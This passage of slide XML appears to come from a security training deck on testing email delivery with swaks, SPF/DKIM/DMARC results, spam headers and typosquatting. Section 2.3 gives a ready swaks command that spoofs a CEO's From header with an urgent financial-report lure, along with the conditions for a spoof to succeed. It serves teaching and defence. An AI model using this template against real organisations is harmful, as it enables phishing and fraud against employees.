              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -y</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> is available in the default Kali repositories.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1065895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marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>📤 2. Sending Test Emails for Spam vs. Inbox Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2.1 Basic SMTP Test (No Authentication)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>This tells you if the remote server accepts mail from your IP at all. Because this uses your local MTA (mail server, like postfix or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>sendmail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) in place of a properly configured one, the messages sent this way almost always end up in the Spam/Junk folder.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># Sends a test email through your local MTA (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Sendmail</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/Postfix)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> --to target@example.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2.2 Sending via a Specific SMTP Relay (Authenticated)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Use this when you have access to a legitimate SMTP server (e.g., your company's mail relay, a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Sendamatic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> sandbox or a testing service) and you want to see how authentication affects spam scores. This will almost always land in the Inbox because the server vouches for you and you have authenticated properly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4092707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300" y="-127000"/>
            <a:ext cx="11468100" cy="6985000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> --from sender@example.com \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --to recipient@example.com \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --server smtp.example.com:587 \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --auth LOGIN \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --auth-user </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>your_username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --auth-password </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>your_password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>tls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Authenticate using the LOGIN mechanism on port 587 with STARTTLS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2.3 Simulating a Spoofed (Phishing) Email</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>This is the key scenario for understanding why emails land in Spam. By using your own domain (attacker.com) as the envelope sender (--from field) but a high-value target domain (ceo@victim-company.com) in the visible From: header, SPF will pass (since your sending IP is allowed to send for attacker.com), but DMARC alignment will fail (the visible domain victim-company.com is not aligned with the envelope sender). This results in a Spam classification or outright rejection if the victim domain has a strict (p=reject) DMARC policy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18943687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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t># Subtle spoofing – shows CEO in the From header but uses your domain in MAIL FROM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> --from legit-sender@attacker.com \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --to employee@victim-company.com \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --server mail.victim-company.com \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --header "Subject: Urgent: Q4 Financial Report Review" \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --header "From: CEO of Victim Company &lt;ceo@victim-company.com&gt;" \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>      --body "Hi team, please review the attached Q4 financial report immediately and provide feedback. [Link]"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>For a successful spoof, you need a domain with a valid SPF record, a server with an IP allowed by that record, and a target domain that relies on SPF alone. If the target domain has implemented DMARC with alignment enforcement, the spoof will be blocked.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>🔬 3. Why Email Goes to Spam – What </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Teaches You</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> output and the email headers you receive tell you exactly which factors contributed to the spam verdict.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>3.1 Read the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> SMTP Conversation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> shows every command and response. Pay close attention to the final server response:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>250 OK id=... : The server accepted the message. Check the spam folder for it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>250 2.0.0 Ok: queued as ... : The message was queued for delivery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36685888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7075714"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>550 5.1.1 ... Recipient address rejected : The recipient address does not exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>550 5.7.1 ... Relaying denied : The SMTP server will not relay for your IP or domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>550 5.7.0 ... Authentication required : The server requires you to log in before sending.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>3.2 Analyze the Authentication-Results Header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>This is the single most important header for understanding spam decisions. Major providers (Google, Outlook) and even on-premises Exchange servers stamp the results of SPF, DKIM, and DMARC checks in the Authentication-Results header.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>An email's path to the Inbox depends heavily on a full set of passing authentication results: SPF, DKIM, and DMARC. Missing or failing any of them can push the email to Spam.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>DKIM alone is not sufficient. Tests show that when Gmail receives a message with only DKIM (and no SPF or DMARC alignment), it not only sends the message to Spam but also displays a prominent spoofing warning.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Conversely, a message without DKIM can still land in the Inbox, provided the sending domain has valid SPF, a p=none DMARC policy, good domain reputation, and a clean Return-Path header.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30665898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596743"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>📬 Inbox: Authentication passes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>The recipient's mail server (e.g., Outlook.com) checked SPF, DKIM, and DMARC.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>console</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>Authentication-Results: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>spf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=pass (sender IP is 192.0.2.10)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>smtp.mailfrom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=example.com; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>dkim</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=pass (signature was verified)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>header.d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=example.com; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>dmarc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=pass (policy=reject) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>header.from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=example.com;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>📁 Spam (or Rejected): Authentication fails</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>The recipient's mail server checked SPF (fail), DKIM (none), and DMARC (fail).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>console</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>Authentication-Results: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>spf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=fail (sender IP is 203.0.113.15)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>smtp.mailfrom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=attacker.com; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>dkim</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=none (message not signed)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>header.d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=attacker.com; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>dmarc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=fail (policy=reject) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0" err="1"/>
              <a:t>header.from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0"/>
              <a:t>=example.com;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35002776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1AB9C2-EBE1-482A-88AB-5F7AB180E610}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="133350" y="171450"/>
            <a:ext cx="12058650" cy="6005513"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>3.3 Additional Headers to Inspect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>X-Forefront-Antispam-Report (Microsoft): Look for fields like SFV:NSPM (Not Spam) versus SFV:SPM (Spam), SCL (Spam Confidence Level), and CAT (Category like PHSH for phishing).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Received: Trace the path of the email. If the first Received is from localhost or an internal IP, that can be a red flag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Message-ID: Unusual or non-random message IDs can trigger filters.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Content-Type: HTML email with heavy JavaScript or excessive external resources often scores higher as spam.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Part 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Find a domain similar to a target (e.g., google.com vs go0gle.com) and explain how it can be used for "Homograph Attacks." </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>1. What is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (also called "URL hijacking" or "domain squatting") is a technique where an attacker registers domain names that are common misspellings or typographical variations of a legitimate, well-known domain. The goal is to capture internet traffic meant for the legitimate site.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26689671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0"/>
            <a:ext cx="12366171" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
